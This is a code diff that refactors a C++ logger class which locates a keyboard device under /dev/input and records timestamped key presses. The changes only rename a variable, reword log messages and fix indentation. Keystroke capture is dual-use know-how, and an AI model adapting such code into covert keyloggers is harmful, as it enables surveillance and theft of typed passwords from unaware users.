@@ -142,17 +142,17 @@ auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 }
 
 auto logger::find_kbd() -> std::string {
-	auto const dev_input = "/dev/input";
-	if (!std::filesystem::exists(dev_input)) {
+	auto const in_dir = "/dev/input";
+	if (!std::filesystem::exists(in_dir)) {
 		MSG(messagetype::error, "logger (find_kbd): directory not found.");
 		return "";
 	}
-	if (!std::filesystem::is_directory(dev_input)) {
-		MSG(messagetype::error, "logger (find_kbd: compiled input directory is not a directory.");
+	if (!std::filesystem::is_directory(in_dir)) {
+		MSG(messagetype::error, "logger (find_kbd): input directory is not a directory.");
 		return "";
 	}
 
-	for (const auto& event_num : std::filesystem::directory_iterator(dev_input)) {
+	for (auto const& event_num : std::filesystem::directory_iterator(in_dir)) {
 		auto const& path = event_num.path();
 		if (path.filename().string().find("event") == 0) {
 			auto const resolved_path = path.string();
@@ -181,14 +181,15 @@ auto logger::find_kbd() -> std::string {
 }
 
 auto logger::ev_reader() -> void {
-	MSG(messagetype::info, "logger (ev_reader): ev_reader loop started.");
+	MSG(messagetype::info, "logger (ev_reader): starting ev_reader.");
 	auto ev = input_event{};
 	while (running_) {
 		fd_set fds;
 		if (auto retval = fd_monitor(fd_, fds); retval == -1) {
 			MSG(messagetype::error, "logger (ev_reader): " + std::string{std::strerror(errno)});
 			break;
-		} else if (retval > 0 && FD_ISSET(fd_, &fds)) {
+		}
+		else if (retval > 0 && FD_ISSET(fd_, &fds)) {
 			auto n = read(fd_, &ev, sizeof(ev));
 			if (n == -1) {
 				if (errno == EAGAIN || errno == EWOULDBLOCK) {
@@ -220,10 +221,10 @@ auto logger::ev_reader() -> void {
 					break;
 				}
 				MSG(messagetype::info, "logger (ev_reader): switched to new device: " + ev_init_);
-        whitelist_.push_back(ev_init_);
+				whitelist_.push_back(ev_init_);
 				continue;
 			}
-      whitelist_.push_back(ev_init_);
+			whitelist_.push_back(ev_init_);
 			auto  dtg      = datetime(ev.time.tv_sec);
 			auto  key_char = get_keychar(ev.code);
 			event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
@@ -236,7 +237,7 @@ auto logger::ev_reader() -> void {
 			}
 		}
 	}
-	MSG(messagetype::info, "logger (ev_reader): ev_reader loop terminate.");
+	MSG(messagetype::info, "logger (ev_reader): ev_reader terminated.");
 }
 
 auto logger::get_keychar(unsigned int code) -> std::string {
